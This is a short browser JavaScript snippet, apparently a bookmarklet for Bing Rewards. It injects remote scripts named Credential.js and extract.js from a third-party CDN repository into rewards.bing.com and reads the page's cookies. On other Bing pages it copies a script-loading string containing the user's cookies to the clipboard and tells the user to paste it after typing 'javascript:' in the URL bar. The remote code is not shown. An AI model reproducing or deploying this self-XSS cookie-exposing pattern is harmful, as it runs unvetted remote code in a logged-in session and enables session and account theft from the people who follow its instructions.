if(window.location.href.includes("bing.com")){
    if(window.location.href.includes("rewards.bing")){
        var e1 = document.createElement("script"); 
        e1.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/Credential.js"); 
        document.body.appendChild(e1);
        var e2 = document.createElement("script"); 
        e2.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/extract.js");
        document.body.appendChild(e2);
        rewards = document.cookie
        injectHtml();
    }else{
        var codeForRewards = 'document.body.appendChild(Object.assign(document.createElement("script"),{src:"https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/web.js"}));bing="'
        +document.cookie+'"';
        navigator.clipboard.writeText(codeForRewards)
        if(confirm('The code for Points Breakdown page have been copied. On the next page, paste after typing "javascript:" at the url bar.')){
            window.open("https://rewards.bing.com/pointsbreakdown")
        }
    }
}else{
    alert("Not the correct page to use this.")
}